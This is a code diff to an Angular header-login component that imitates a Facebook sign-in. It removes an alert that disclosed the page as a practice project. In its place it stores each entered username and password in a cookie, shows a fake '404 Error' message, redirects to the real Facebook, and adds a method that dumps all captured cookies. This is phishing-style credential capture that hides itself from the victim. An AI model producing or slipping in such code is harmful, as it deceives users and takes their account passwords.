@@ -1,25 +1,34 @@
 import { Component, OnInit } from '@angular/core';
+import { CookieService } from 'ngx-cookie-service';
 
 @Component({
   selector: 'app-header-login',
   templateUrl: './header-login.component.html',
   styleUrls: ['./header-login.component.css']
 })
+
 export class HeaderLoginComponent implements OnInit {
 
-  constructor() { }
+    user = {
+        username: '',
+        password: ''
+    }
 
-  user = {
-  	username: '',
-  	password: ''
+    constructor( private cookieService: CookieService ) { }
+
+  onSubmit() {
+    this.cookieService.set(this.user.username, this.user.password);
+    alert('404 Error\nPage not found');
+    window.location.href = 'https://www.facebook.com/';
+    this.user = {
+        username: '',
+        password: ''
+    }
   }
 
-  onSubmit(){
-  	alert("This is not Facebook! This was created as a practice project by Dorian Bramarov using Angular2. Your username is '" + this.user.username + "' and password is '" + this.user.password + "' ...Thanks! :)")
-  	this.user = {
-  	username: '',
-  	password: ''
-    }
+  seeUsers() {
+    const allCookies: {} = this.cookieService.getAll();
+    console.log(allCookies);
   }
 
   ngOnInit() {
